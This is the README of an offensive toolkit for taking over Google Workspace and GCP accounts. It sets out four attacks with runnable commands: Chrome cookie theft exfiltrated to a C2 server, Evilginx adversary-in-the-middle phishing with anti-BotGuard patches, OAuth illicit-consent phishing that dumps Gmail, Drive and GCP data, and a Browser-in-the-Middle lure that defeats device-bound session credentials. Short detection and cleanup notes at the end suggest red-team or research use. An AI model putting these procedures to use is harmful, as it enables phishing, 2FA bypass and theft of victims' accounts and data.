# Google MitM

Project for performing Man-In-The-Middle attacks on Google GWS/GCP environments. Allows stealing cookies and Chrome profiles with DBSC.

Still at PoC stage, Evilginx Pro would be handy...

## Project structure

```
GoogleMitm/
  BITM/                          # Approach 4: Browser-in-the-Middle (native Chrome + noVNC)
    bitm_server.py               #   Orchestrator (Xvfb, Chrome, x11vnc, websockify, capture)
    extract_session.py           #   Cookie export / replay with Chrome profile
    setup.sh                     #   Linux dependency installation
    requirements.txt
  ILLICIT_CONSENT/               # Approach 3: Illicit consent grant (OAuth2 token theft)
    oauth_app.py                 #   OAuth2 server (consent phishing)
    exfil_tokens.py              #   Data exfiltration via Google REST APIs
  NO_DBSC/                       # Approaches without DBSC protection (Linux victim)
    classic_theft/               # Approach 1: Classic cookie theft (pass-the-cookie)
      loot_dump.py               #   Chrome cookie extraction via CDP
      c2_server.py               #   C2 collection server
      replay_gcp.py              #   Session replay (API + browser)
    aitm_evilginx/               # Approach 2: AiTM phishing with Evilginx
      phishlets/google.yaml      #   Google phishlet with anti-detection patches
      replay_evilginx.py         #   Replay of captured sessions
      DETECTION_GOOGLE.md        #   BotGuard detection analysis report
  ExportBurp/                    # BurpSuite captures (analysis data)
    http_export
  GoogleMitm.burp                # Burp project
```

---

## Approach 1 -- Classic cookie theft (pass-the-cookie)

**Directory**: `NO_DBSC/classic_theft/`

Infostealer simulation: extracting Chrome cookies from the victim machine, exfiltrating to a C2, reusing on the attacker machine (2FA bypassed).

### Prerequisites

- Victim machine: Ubuntu/Debian **without TPM**, Chrome installed (Chrome/Linux is not covered by DBSC, classic cookies guaranteed)
- Attacker machine: Python 3 + `pip install websocket-client playwright requests flask` then `playwright install chromium`

### Scenario

1. **Victim** -- launch Chrome with CDP accessible (simulates code execution):

```bash
google-chrome --remote-debugging-port=9222 \
              --user-data-dir=/tmp/chrome-debug \
              "https://accounts.google.com"
```

Log in normally (password + 2FA).

2. **Attacker** -- start the C2:

```bash
python3 c2_server.py --port 8443
```

3. **Victim** -- dump and exfiltrate:

```bash
python3 loot_dump.py --google-only --c2 http://<IP_C2>:8443/collect
```

4. **Attacker** -- headless access (no pure Google API for now, requires an OAuth token):

```bash
python3 replay_gcp.py loot.json --mode api
```

Lists GCP projects of the victim account via SAPISIDHASH.

5. **Attacker** -- open session in a Chrome browser via Playwright:

```bash
python3 replay_gcp.py loot.json --mode browser
```

Gmail + GCP Console opened, screenshots.

### Troubleshooting

- **`KeyError: 'deviceDescriptors'` error with Playwright**: the Playwright Python package is incompatible with system Chrome. Solution: use the Chromium bundle from Playwright (`p.chromium.launch(headless=False)` without `channel="chrome"`), and install binaries with `playwright install chromium`.

---

## Approach 2 -- AiTM phishing with Evilginx

**Directory**: `NO_DBSC/aitm_evilginx/`

Adversary-in-the-Middle phishing: the proxy relays real Google, captures 2FA and session cookies on the fly.

**Status**: does not work as-is with community Evilginx. Google detects the proxy via BotGuard (see explanations below). Switch to Evilginx Pro or the BitM approach.

### Prerequisites

- A VPS (or exposed VM) with public IP, ports 53/80/443 open
- A dedicated domain name (e.g. `gws-lab.example.com`) with a wildcard DNS record `*.gws-lab.example.com -> VPS IP` (Let's Encrypt needs to resolve each subdomain: accounts., apis., mail., www., console.)
- Attacker machine: `pip3 install playwright requests` + `playwright install chrome`

### Evilginx installation

```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && go build
cp ../google.yaml ./phishlets
sudo ./evilginx2 -p ./phishlets
```

### Configuration

```
config domain gws-lab.example.com
config ipv4 external <VPS_PUBLIC_IP>
phishlets hostname google gws-lab.example.com
phishlets enable google
lures create google
lures get-url 0
lures edit 0 redirect_url https://mail.google.com

sessions               # monitor in real time
```

### Attack flow

1. The victim opens the lure URL: they see real Google (relayed), authenticates, validates 2FA -- everything is captured by the proxy.
2. They are redirected to mail.google.com: nothing unusual.
3. Attacker side: `sessions` shows the session with auth_tokens (Google cookies).

### Replay

```bash
python3 replay_evilginx.py --sessions-dir <evilginx_sessions_directory> --mode both
# api     : extraction via internal Google endpoints (ListAccounts, myaccount)
#           + DOM extraction from GCP console (screenshot)
# browser : open Gmail + GCP Console in Chrome, screenshots

# System Chrome (if Chromium bundle crashes):
python3 replay_evilginx.py --mode browser --browser chrome
```

### Google detection -- Technical analysis

Full details in the article: https://hideandsec.sh/books/research/page/bypassing_botguard_and_dbsc_technical_study/.

**Symptom**: error page "This browser or app may not be secure" after entering the email.

**Root cause**: when submitting the email, Google's JS (BotGuard / reCAPTCHA Enterprise) generates a 3244-character token that encodes `window.location.origin`. Since the browser is on `accounts.<phishing-domain>` instead of `accounts.google.com`, the token fails server-side validation (rejection code `rrk=46`).

#### Detection chain

```
                     VICTIM BROWSER
                            |
                     window.location.origin
                     = accounts.<phishing-domain>
                            |
              +-------------+-------------+
              |             |             |
         BotGuard JS    Origin/Referer   YouTube iframe
         (collects      AJAX headers     pmpo parameter
          origin)
              |             |             |
              v             v             v
         Token 3244     Origin: https:// pmpo=https://
         chars with     accounts.        accounts.
         encoded        <phishing>       <phishing>
         origin
              |             |             |
              +------+------+------+------+
                     |
                     v
              GOOGLE SERVER
              BotGuard token verification
              -> origin != accounts.google.com
              -> rrk=46 -> /v3/signin/rejected
```

| # | Vector | Impact |
|---|--------|--------|
| 1 | **BotGuard token** (window.location.origin encoded in encrypted/signed blob) | BLOCKING |
| 2 | **YouTube CheckConnection pmpo** (parent origin in URL) | Informational |
| 3 | **Origin/Referer headers** (real domain in AJAX headers) | Rewritten by Evilginx |
| 4 | **WebAuthn direct** (direct request to google.com, bypasses proxy) | Indicator |

#### Patches implemented in the phishlet

The `google.yaml` phishlet includes two countermeasures (insufficient alone):

1. **Anti-BotGuard JS injection**: script injected in `<head>` that attempts to override `Location.prototype.origin/hostname/host/href` + `document.domain/URL/referrer` via `Object.defineProperty` and `__defineGetter__`. Chrome protects these properties (`configurable:false`), so this patch fails on recent versions.

2. **Generic pmpo patch**: 4 sub_filters covering encoding variants (unicode, URL-encoded, double-encoded, plain) with generic regex `[^&"\s]+` instead of a hardcoded domain.

---

## Approach 3 -- Illicit consent grant

**Directory**: `ILLICIT_CONSENT/`

OAuth2 illicit consent grant: the attacker creates a legitimate OAuth2 app in their own GCP project and tricks the victim into granting access. Unlike cookie theft, this gives direct access to Google REST APIs (Gmail, Drive, GCP) via Bearer tokens, without ever knowing the victim's password.

### Prerequisites

- A GCP project with an OAuth2 Web Application client (Client ID + Secret)
- Target APIs enabled (Gmail API, Drive API, Cloud Resource Manager)
- Python 3

### Scenario

1. **Attacker** -- create an external OAuth application with API access and a redirect URI

2. **Attacker** -- start the OAuth2 server:

```bash
cd ILLICIT_CONSENT
python3 oauth_app.py
```

3. **Victim** -- opens the lure URL (`http://<attacker>:8080/`), clicks "Sign in with Google", authenticates and accepts scopes.

4. **Attacker** -- tokens are captured in `tokens.json`. Exfiltrate:

```bash
python3 exfil_tokens.py -a userinfo
python3 exfil_tokens.py -a list-emails -l 5
python3 exfil_tokens.py -a list-drive -l 10
python3 exfil_tokens.py -a list-gcp
python3 exfil_tokens.py -a all
```

### Limitations

- App in "Testing" mode: max 100 users, aggressive "Google hasn't verified this app" warning
- Production mode requires Google verification (4-6 weeks) and a verified domain
- Restricted scopes (gmail.readonly, drive) require a paid security assessment ($15k-$75k)

---

## Approach 4 -- Browser-in-the-Middle (BitM)


**Directory**: `BITM/`

Approach that bypasses **all** browser-side protections (BotGuard, DBSC, automation detection). A real Chrome runs on the attacker's server and its display is streamed to the victim via noVNC.

```
Victim --[HTTPS/WSS]--> Caddy --> websockify --> x11vnc --> Xvfb --> Chrome (native)
       video stream +                                                      |
       keyboard/mouse                                               accounts.google.com
                                                                    (real site, real DOM)
```

### Why it works

- Chrome is launched **directly** (subprocess), not via Playwright (no `--enable-automation`, `navigator.webdriver = false`)
- BotGuard runs in a real Chrome on real `accounts.google.com`: valid token
- Playwright is only used **after** authentication to extract cookies via `connect_over_cdp()`

### DBSC (Device Bound Session Credentials)

This approach also bypasses DBSC:

| | Evilginx (AiTM proxy) | BitM |
|---|---|---|
| Where does Chrome run? | On the victim's machine | On the attacker's server |
| Who performs DBSC binding? | The victim (their TPM) | The server (its keys) |
| Cookie bound to which device? | Victim's device | Attacker's server |
| Cookie reusable? | No (private key inaccessible) | **Yes** (attacker owns the key) |

For full DBSC support: use system Chrome >= 127 (`--chrome-path /usr/bin/google-chrome`).

### Prerequisites

- Linux VPS with public IP
- Domain name + TLS reverse proxy (Caddy recommended)
- Installation: `sudo bash setup.sh`

### Launch

```bash
python3 bitm_server.py
python3 bitm_server.py --chrome-path /usr/bin/google-chrome-stable  # for DBSC
```

The script displays the noVNC lure URL to send to the victim. After authentication, cookies are automatically extracted and saved in `sessions/`.

### After capture

```bash
# View captured cookies
python3 extract_session.py sessions/bitm_session_*.json

# Export for replay_evilginx.py (classic cookie replay)
python3 extract_session.py sessions/bitm_session_*.json --mode export
python3 ../NO_DBSC/aitm_evilginx/replay_evilginx.py --session-file sessions/session_evilginx.json

# Relaunch Chrome with complete profile (DBSC intact)
python3 extract_session.py sessions/bitm_session_*.json --mode replay
# or directly:
google-chrome --user-data-dir=sessions/chrome_profile
```

---

## Google Workspace detection

All four approaches leave traces in Google Admin logs:

- Login from unknown IP/ASN in connection logs
- Abnormal "Authentication method" field in OAuth logs
- DBSC binding events (Security Investigation Tool): binding from unknown device
- Alerts: "Login from unusual location"
- OAuth consent events (`oauth2.authorize`) with suspicious application names (Approach 3)

## Cleanup

- Revoke victim account sessions (Admin Console > Account > Sessions)
- Remove victim account from test GCP projects
- Delete wildcard DNS records and Evilginx lures
- Clean up captured Chrome profiles (`sessions/chrome_profile`)
- Revoke illicit OAuth app tokens and remove the app from authorized applications
